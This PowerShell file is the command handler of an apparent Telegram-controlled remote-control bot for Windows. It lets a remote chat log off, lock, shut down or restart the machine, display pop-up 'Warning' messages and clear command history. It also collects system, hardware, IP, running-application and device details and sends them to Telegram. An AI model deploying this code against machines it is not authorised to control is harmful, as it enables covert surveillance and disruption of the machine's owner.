# System Management Commands

function Process-SystemCommands {
    param (
        [string[]]$parts
    )
    
    switch ($parts[0]) {
        "/logoff" {
            $logoffCommand = "shutdown.exe /l"
            try {
                Invoke-Expression $logoffCommand
                Send-TelegramMessage -message "The current user is being logged off."
            } catch {
                Send-TelegramMessage -message "Failed to log off the current user. Error: $_"
            }
        }
        "/showmessage" {
            $customMessage = $parts[1..($parts.Length - 1)] -join " "
            Add-Type -AssemblyName PresentationFramework
            [System.Windows.MessageBox]::Show($customMessage, "Warning")
            Send-TelegramMessage -message "Displayed message: $customMessage"
        }
        "/lockcomputer" {
            rundll32.exe user32.dll, LockWorkStation
            Send-TelegramMessage -message "The computer has been locked."
        }
        "/shutdown" {
            if ($parts.Length -gt 1) {
                $delay = $parts[1]
                Start-Sleep -Seconds $delay
                Send-TelegramMessage -message "Shutting down the computer in $delay seconds."
            } else {
                Send-TelegramMessage -message "Shutting down the computer immediately."
            }
            Stop-Computer -Force
        }
        "/restart" {
            Restart-Computer -Force -Confirm:$false
            Send-TelegramMessage -message "The computer is restarting."
        }
        "/sysinfo" {
            $sysInfo = Get-ComputerInfo
            Send-TelegramMessage -message "System Info: OS: $($sysInfo.WindowsVersion), Build: $($sysInfo.OSBuildNumber)"
        }
        "/getcurrentdir" {
            $currentDir = Get-Location
            Send-TelegramMessage -message "Current Directory: $currentDir"
        }
        "/gethardwareinfo" {
            $hardwareInfo = Get-CimInstance -ClassName Win32_ComputerSystem
            Send-TelegramMessage -message "Hardware Info: Manufacturer: $($hardwareInfo.Manufacturer), Model: $($hardwareInfo.Model)"
        }
        "/gethistory" {
            $history = Get-History
            $formattedHistory = $history | ForEach-Object { "$($_.Id): $($_.CommandLine)" }
            Send-TelegramMessage -message "Command History: $($formattedHistory -join ', ')"
        }
        "/clearhistory" {
            Clear-History
            Send-TelegramMessage -message "History cleared."
        }
        "/getsystemstatus" {
            $battery = Get-WmiObject Win32_Battery
            $network = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
            $cpuUsage = Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average
            $ramUsage = Get-WmiObject Win32_OperatingSystem | Select-Object FreePhysicalMemory, TotalVisibleMemorySize
            $statusMessage = "Battery Level: $($battery.EstimatedChargeRemaining)%, CPU Usage: $($cpuUsage.Average)%, " +
                            "RAM Usage: $([math]::round((($ramUsage.TotalVisibleMemorySize - $ramUsage.FreePhysicalMemory) / $ramUsage.TotalVisibleMemorySize) * 100, 2))%, " +
                            "Network: $($network.Name), SSID: $($network.Ssid)"
            Send-TelegramMessage -message $statusMessage
        }
        "/getip" {
            $ipAddress = (Invoke-RestMethod -Uri "http://api.ipify.org")
            Send-TelegramMessage -message "Your IP Address: $ipAddress"
        }
        "/getopenedapplications" {
            $openedApps = Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -Property Name
            Send-TelegramMessage -message "Opened Applications: $($openedApps.Name -join ', ')"
        }
        "/getuptime" {
            $uptime = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
            Send-TelegramMessage -message "System Uptime: $([math]::round($uptime.TotalDays, 2)) days."
        }
        "/getstoragedetails" {
            $storageDetails = Get-PSDrive -PSProvider FileSystem | Select-Object -Property Name, @{Name='Used (GB)'; Expression={[math]::round($_.Used/1GB, 2)}}, 
                                                            @{Name='Free (GB)'; Expression={[math]::round($_.Free/1GB, 2)}}, 
                                                            @{Name='Total (GB)'; Expression={[math]::round($_.Used/1GB, 2) + [math]::round($_.Free/1GB, 2)}}, 
                                                            @{Name='Drive Label'; Expression={ (Get-Volume -DriveLetter $_.Name).FileSystemLabel }}
            $storageInfo = "Storage Details:`n"
            foreach ($storage in $storageDetails) {
                $storageInfo += "Drive: $($storage.Name)`n"
                $storageInfo += "Label: $($storage.'Drive Label')`n"
                $storageInfo += "Used: $($storage.'Used (GB)') GB`n"
                $storageInfo += "Free: $($storage.'Free (GB)') GB`n"
                $storageInfo += "Total: $($storage.'Total (GB)') GB`n"
                $storageInfo += "----------------------------------`n"
            }
            Send-TelegramMessage -message $storageInfo
        }
        "/getHardwaredevices" {
            $devices = Get-PnpDevice | Where-Object { 
                $_.FriendlyName -like "*Keyboard*" -or 
                $_.FriendlyName -like "*Mouse*" -or 
                $_.FriendlyName -like "*USB*"
            }
            $deviceInfo = "Connected Devices:`n"
            foreach ($device in $devices) {
                $deviceInfo += "Name: $($device.Name)`n"
                $deviceInfo += "ID: $($device.InstanceId)`n"
                $deviceInfo += "Class: $($device.Class)`n"
                $deviceInfo += "------------------------------------`n"
            }
            if ($devices.Count -eq 0) {
                $deviceInfo = "No devices found matching Keyboard, Mouse, or USB."
            }
            Send-TelegramMessage -message $deviceInfo
        }
    }
} 